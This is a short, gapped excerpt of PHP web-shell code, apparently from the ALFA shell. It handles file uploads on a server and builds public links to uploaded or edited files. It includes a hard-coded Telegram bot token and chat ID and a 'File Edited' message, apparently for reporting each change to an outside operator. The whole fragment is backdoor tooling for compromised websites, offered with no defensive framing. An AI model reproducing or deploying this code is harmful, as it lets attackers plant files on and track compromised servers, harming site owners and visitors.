...
if($move_cmd_file&&$alfa_canruncmd){
	...
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$permalink = $protocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . $file['name'];
...
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$link = $protocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . $_POST['alfa1'];
$token = "7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8";
$chat_id = "-1002856618500";
$msg = urlencode("📝 <b>File Edited</b>\n🔗 <a href=\"$link\">".$_POST['alfa1']."</a>");
